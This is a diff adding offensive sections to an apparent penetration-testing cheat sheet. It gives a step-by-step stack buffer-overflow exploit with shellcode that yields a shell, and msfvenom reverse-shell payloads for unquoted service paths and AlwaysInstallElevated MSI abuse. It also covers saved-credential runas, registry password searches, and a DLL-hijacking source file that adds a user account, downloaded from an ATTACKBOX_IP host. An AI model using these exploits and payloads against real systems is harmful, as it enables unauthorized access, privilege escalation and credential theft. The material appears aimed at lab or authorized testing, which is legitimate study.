@@ -375,6 +375,87 @@ on Browser, search `http://localhost:8111`
 
 
 
+### Buffer Overflow
+
+If argv[1] is used, use `./<script> $(python -c "<command>")`
+
+Else if get() or getline() is used, use `./<script> < <(python -c "<command>")` or `./<script> < out.txt`
+
+```
+gdb -q <file_path>
+(gdb) r $(python -c "print('A' * 155)")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000414141 in ?? ()
+```
+
+You can assume offset is 152
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+```
+
+```
+(gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A...'
+(gdb) i r
+...
+rbp            0x6641396541386541	0x6641396541386541
+...
+```
+
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
+Exact match at offset 144
+```
+
+From above, you can see offset is 144, registry is 8, so you need 152 bytes to reach return address.
+
+```
+(gdb) r $(python -c "print('A' * 152 + 'BBBBBBBB')")
+(gdb) x/xg $rsp
+0x7fffffffe2c8: 0x4242424242424242
+```
+
+Successfully overwrote return address!
+
+The script is owned by user with uid 1003, `pwn shellcraft -f d amd64.linux.setreuid 1003` and get shell `\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`
+
+Then, pick shell from [here](http://shell-storm.org/shellcode/)
+
+```
+(gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + 'BBBBBBBB')")
+(gdb) x/100x $rsp-160
+0x7fffffffe228: 0x9090909090909090      0x9090909090909090
+0x7fffffffe238: 0x9090909090909090      0x9090909090909090
+0x7fffffffe248: 0x9090909090909090      0x9090909090909090
+0x7fffffffe258: 0x9090909090909090      0x9090909090909090
+0x7fffffffe268: 0x9090909090909090      0x9090909090909090
+0x7fffffffe278: 0xebbf66ff31909090      0x0ffe894858716a03
+0x7fffffffe288: 0x969dd1bb48c03105      0xdbf748ff978cd091
+0x7fffffffe298: 0x5e545752995f5453      0x41414141050f3bb0
+0x7fffffffe2a8: 0x4141414141414141      0x4141414141414141
+0x7fffffffe2b8: 0x4141414141414141      0x4141414141414141
+0x7fffffffe2c8: 0x4242424242424242      0x00007fffffffe300
+0x7fffffffe2d8: 0x0000000200000000      0x00000000004005e0
+```
+
+As you see above, you can pick address suck as 0x7fffffffe268
+
+```
+(gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
+process 5250 is executing new program: /usr/bin/bash
+sh-4.2$
+```
+
+Successfully got shell!
+
+```
+./<service> $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
+sh-4.2$
+```
+
+
+
 ## Persistence
 
 ### Adding SSH key
@@ -478,6 +559,10 @@ initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nisha
 
   `findstr /si password *.txt` (`.xml`, `.ini`, `.config`, `.xls` are also good choice)
 
+  Directory: `dir /b /s "directoryname"`
+
+  File: `where /r . *.pdf`
+
 - Patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
 
 - Network: `netstat -ano`
@@ -491,7 +576,25 @@ initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nisha
   - Windows defender: `sc query windefend`
   - Antivirus software: `sc queryex type=service`
 
+- Software Versions
 
+  `wmic product get name,version,vendor`
+
+  `wmic service list brief | findstr "Running"`
+
+  `wmic service get name,displayname,pathname,startmode`
+
+  `sc qc <service>`
+
+- Unquoted Service Path
+
+  `sc qc unquotedsvc`
+
+  Check file permission: `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`
+
+  Then, `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > executable_name.exe`
+
+  After that, `sc start unquotedsvc`
 
 ### RDP
 
@@ -742,6 +845,22 @@ Show owner of file: `Get-Acl C:/`
 
 - Metasploit: `multi/recon/local_exploit_suggester`
 
+### Windows Installer
+
+If both of these are set, 
+
+`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
+
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+
+Then, `msfvenom -p windows/x64/shell_reverse_tcp LHOST=A<IP> LPORT=<port> -f msi -o malicious.msi`
+
+```shell
+Shell> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
+
+
+
 ### token impersonation
 
 ```powershell
@@ -798,9 +917,54 @@ python3 firefox_decrypt.py <file path>
 
 use psexec in impacket, or rpc to login
 
-### Gain Base64 encoded password
+### Passwords
 
-hash is in C:\Windows\Panther\Unattend\Unattended.xml
+- Gain Base64 encoded password
+
+  hash is in C:\Windows\Panther\Unattend\Unattended.xml
+
+- Saved credentials
+
+  If `cmdkey /list` worked, try `runas /savecred /user:admin reverse_shell.exe`
+
+- Registry keys containing passwords
+
+  `reg query HKLM /f password /t REG_SZ /s`
+
+  `reg query HKCU /f password /t REG_SZ /s`
+
+- Unattend.xml sometimes worth reading
+
+### DLL Hijacking
+
+Vulnerability scanner: Process Monitor (ProcMon) (Need admin priv to run.)
+
+If there are missing dll file, you can create
+
+```c
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k net user jack Password11");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+If don't have mingw, `apt install gcc-mingw-w64-x86-64`
+
+```bash
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+```
+
+Then on target powershell, 
+
+```powershell
+wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
+sc stop <service> & sc start <service>
+```
 
 
 
